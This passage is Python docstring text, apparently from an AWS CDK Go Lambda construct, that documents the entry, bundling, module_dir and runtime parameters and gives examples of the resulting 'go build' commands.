        :param entry: (experimental) The path to the folder or file that contains the main application entry point files for the project. This accepts either a path to a directory or file. If a directory path is provided then it will assume there is a Go entry file (i.e. ``main.go``) and will construct the build command using the directory path. For example, if you provide the entry as:: entry: 'my-lambda-app/cmd/api' Then the ``go build`` command would be:: `go build ./cmd/api` If a path to a file is provided then it will use the filepath in the build command. For example, if you provide the entry as:: entry: 'my-lambda-app/cmd/api/main.go' Then the ``go build`` command would be:: `go build ./cmd/api/main.go`
        :param bundling: (experimental) Bundling options. Default: - use default bundling options
        :param module_dir: (experimental) Directory containing your go.mod file. This will accept either a directory path containing a ``go.mod`` file or a filepath to your ``go.mod`` file (i.e. ``path/to/go.mod``). This will be used as the source of the volume mounted in the Docker container and will be the directory where it will run ``go build`` from. Default: - the path is found by walking up parent directories searching for a ``go.mod`` file from the location of ``entry``
        :param runtime: (experimental) The runtime environment. Only runtimes of the Golang family and provided family are supported. Default: lambda.Runtime.PROVIDED_AL2
